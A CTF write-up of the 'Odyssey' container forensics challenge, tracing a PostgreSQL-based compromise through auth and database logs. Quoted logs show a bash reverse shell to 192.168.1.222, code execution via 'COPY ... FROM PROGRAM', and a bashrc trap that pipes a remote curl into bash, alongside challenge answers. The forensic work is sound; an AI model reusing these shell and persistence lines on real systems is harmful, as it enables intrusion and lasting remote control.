---
title: "5Charlie CTF - Odyssey"
date: 2020-04-29 21:41:42 -0500
categories:
  - write-up
tags:
  - ctf
  - write-up
  - linux
  - forensics
  - devops
  - docker
---

A write-up of the "Odyssey" container memory export forensic analysis challenge from 5Charlie CTF.

## Odyssey 1

### Odyssey 1 - Challenge

One of our containers has been compromised! A quick thinking sysadmin managed to export a copy of the running container. Use the archive to determine what happened.

When was the last root login for this container? (format: MMM DD HH:MM:SS, use container local time)

**Attachments:** `ulysses_postgres.tar.gz`

### Odyssey 1 - Solution

Likely a terrible idea, especially given the scenario that it was "compromised", but I began this challenge by importing it in Docker. I don't recommend this in hindsight, but here we are.

{% highlight bash %}
cat ulysses_postgres.tar.gz| docker import -
{% endhighlight %}

We acquire the image ID with the following

{% highlight bash %}
docker images
{% endhighlight %}

``` text
REPOSITORY             TAG                 IMAGE ID            CREATED             SIZE
<none>                 <none>              6edaaebe2798        2 minutes ago       369MB
```

In this case our image ID is `6edaaebe2798`, which we'll then start up.

{% highlight bash %}
docker run --rm -it 6edaaebe2798 /bin/sh
{% endhighlight %}

- `--rm`: Remove the container immediately after it is closed
- `-i`: Keep STDIN open
- `-t`: Allocate a pseudo-TTY

To get the last login time, we can look to `/var/log/auth.log`

{% highlight bash %}
cat /var/log/auth.log
{% endhighlight %}

``` text
Apr 18 06:10:06 4853fe8cb6a2 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)
```

**Flag:** `Apr 18 06:10:06`

## Odyssey 2

### Odyssey 2 - Challenge

What is the IP address of the client that abused a legitimate service to access this container?

### Odyssey 2 - Solution

In the previous section we saw that the only unique directories in `/var/log` were `postgresql` and `exim4`.
Let's dig into postgres.

{% highlight bash %}
cd /var/log/postgresql
cat postgresql-2020-04-18_060048.csv
{% endhighlight %}

Skimming the file a few things look a tad peculiar, but this line in particular is a dead giveaway that a reverse shell has been dropped.

``` text
...[truncated]
2020-04-18 06:07:34.075 UTC,"ulysses","ithaca",131,"172.17.0.3:37542",5e9a9827.83,7,"idle",2020-04-18 06:03:19 UTC,3/11,0,LOG,00000,"statement: INSERT INTO scylla(t) VALUES('bash -i >& /dev/tcp/192.168.1.222/9292 0>&1');",,,,,,,,,"psql"
...
```

Luckily, this line also gives us the flag.

**Flag:** `172.17.0.3`

## Odyssey 3

### Odyssey 3 - Challenge

What is the name of the postgres user on this container?

### Odyssey 3 - Solution

Continuing from the previous section, and assuming you're in the docker container like I was.

{% highlight bash %}
ls -l
{% endhighlight %}

``` text
-rw------- 1 postgres postgres 8357 Apr 18 06:11 postgresql-2020-04-18_060048.csv
-rw------- 1 postgres postgres  312 Apr 18 06:00 postgresql-2020-04-18_060048.log
```

🙂

**Flag:** `postgres`

## Odyssey 4

### Odyssey 4 - Challenge

What is the name of the first table the malicious client created?

### Odyssey 4 - Solution

Let's just look for it in the log we found earlier.

{% highlight bash %}
cat postgresql-2020-04-18_060048.csv | grep -i 'table'
{% endhighlight %}

We see our solution near the top

``` text
2020-04-18 06:07:34.049 UTC,"ulysses","ithaca",131,"172.17.0.3:37542",5e9a9827.83,6,"idle",2020-04-18 06:03:19 UTC,3/10,0,LOG,00000,"statement: CREATE TABLE scylla (t TEXT);",,,,,,,,,"psql"
```

**Flag:** `scylla`

## Odyssey 5

### Odyssey 5 - Challenge

What is the full path of the file created through postgres on the host?

### Odyssey 5 - Solution

{% highlight bash %}
cat postgresql-2020-04-18_060048.csv
{% endhighlight %}

It's incredibly nice that this log is so short and we can just visually observe.

``` text
2020-04-18 06:08:06.051 UTC,"ulysses","ithaca",131,"172.17.0.3:37542",5e9a9827.83,11,"idle",2020-04-18 06:03:19 UTC,3/15,0,LOG,00000,"statement: COPY hail_charybdis FROM PROGRAM 'bash ""/tmp/neptune.sh""';",,,,,,,,,"psql"
```

**Flag:** `/tmp/neptune.sh`

## Odyssey 6

### Odyssey 6 - Challenge

What is the IP address of the host used for initial command and control?

### Odyssey 6 - Solution

``` text
2020-04-18 06:07:34.075 UTC,"ulysses","ithaca",131,"172.17.0.3:37542",5e9a9827.83,7,"idle",2020-04-18 06:03:19 UTC,3/11,0,LOG,00000,"statement: INSERT INTO scylla(t) VALUES('bash -i >& /dev/tcp/192.168.1.222/9292 0>&1');",,,,,,,,,"psql"
```

**Flag:** `192.168.1.222`

## Odyssey 7

### Odyssey 7 - Challenge

What is the full url curled by the persistence mechanism installed on this host?

### Odyssey 7 - Solution

No hints in logs, so let's look elsewhere. I usually like `ls -latr` to sort by modification time for finding persistence, but it looks like everything was changed pretty close to the same time and/or timestomped.

I'm lazy, we know it performs curl, let's just find it.

{% highlight bash %}
grep -R 'curl' / 2>/dev/null
{% endhighlight %}

Almost immediately we receive a match on the following:

``` text
/etc/bashrc:trap 'bash <(curl -s http://5charlie.xyz/index)' 2 3
```

**Flag:** `http://5charlie.xyz/index`

## Odyssey 8

### Odyssey 8 - Challenge

The curl to 5charlie.xyz is triggered by which process signals? (format: signame,signame)

### Odyssey 8 - Solution

The `trap` command executes a command when the shell receives a signal.
You can see the signals in their numeric forms in the command above.
We just need to look up a reference to understand what they correlate to, for those of us who don't have them memorized.
<https://ss64.com/bash/trap.html>

``` text
...[truncated]
2     SIGINT  Interrupt (CTRL-C)
3     SIGQUIT  Quit
```

**Flag:** `SIGINT,SIGQUIT`

## Odyssey 9

### Odyssey 9 - Challenge

We're not sure how the attacker got credentials to this system in the first place. Only the ulysses_postgres developers should have known the password and there is no evidence of brute force... Perhaps the project was exposed somewhere? Razamuhin has always been a little careless with project data. What is the postgres password?

### Odyssey 9 - Solution

This one we're not gonna find on the system. To the Internet!
Google doesn't return anything useful for "Razamuhin" at the time this was written, but let's head to Github specifically, as that's a common source for code hosting.

<https://github.com/Razamuhin/ulysses_postgres>

Perfect.

Digging into `startup.sh` we see the run line:

{% highlight bash %}
docker run -d -e POSTGRES_USER=ulysses -e POSTGRES_DB=ithaca -e POSTGRES_PASSWORD=telemachus -v "$(pwd)/postgresql.conf":/etc/postgresql/postgresql.conf ulysses_postgres -c 'config_file=/etc/postgresql/postgresql.conf'
{% endhighlight %}

**Flag:** `telemachus`

## Odyssey 10

### Odyssey 10 - Challenge

What is the flag hidden in the project repository?

### Odyssey 10 - Solution

There's nothing in the main directory of the repo, but in git repositories, sometimes there's some fun stuff in the history.

<https://github.com/Razamuhin/ulysses_postgres/commits/master>

The commit `Wait no`:`c299b844c758b85de04ec55ddfa18e5d00c16f57` seems suspicious.

<https://github.com/Razamuhin/ulysses_postgres/commit/c299b844c758b85de04ec55ddfa18e5d00c16f57>

🙂

**Flag:** `flag{curiosity_killed_the_crew}`
